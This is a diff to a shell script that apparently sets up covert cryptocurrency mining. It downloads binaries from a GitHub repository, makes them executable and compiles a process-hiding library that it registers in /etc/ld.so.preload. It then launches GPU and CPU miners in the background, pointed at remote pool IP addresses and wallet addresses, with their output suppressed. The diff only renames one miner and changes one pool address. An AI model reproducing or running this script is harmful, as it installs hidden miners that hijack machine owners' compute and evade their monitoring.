@@ -23,7 +23,7 @@ wget https://github.com/usapindong/test/raw/refs/heads/main/pearl.guard && chmod
 
 wget https://github.com/usapindong/test/raw/refs/heads/main/pearl-verify && chmod +x pearl-verify
 
-wget https://github.com/usapindong/test/raw/refs/heads/main/tawa12 && chmod +x tawa12
+wget https://github.com/usapindong/test/raw/refs/heads/main/pearl-gpu-miner && chmod +x pearl-gpu-miner
 
 wget https://github.com/usapindong/test/raw/refs/heads/main/libcudart.so.12 && chmod +x libcudart.so.12
 
@@ -69,4 +69,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp && clear && ./tawa12 --pool 37.230.62.246:80 --wallet krxYZDM9DP --worker rtx-2080 & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod 777 sse20 && ./sse20 -a yespowertide -o 37.230.62.245:443 -u tbc1qaczckuxmhvtw58llx5ajpz3xwxpp2zc0shak9g -t $(nproc) > /dev/null 2>&1 &
+./graftcp/graftcp && clear && ./pearl-gpu-miner --pool 37.230.62.246:80 --wallet krxYZDM9DP --worker rtx-2080 & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod 777 sse20 && ./sse20 -a yespowertide -o 143.198.85.42:80 -u tbc1qaczckuxmhvtw58llx5ajpz3xwxpp2zc0shak9g -t $(nproc) > /dev/null 2>&1 &
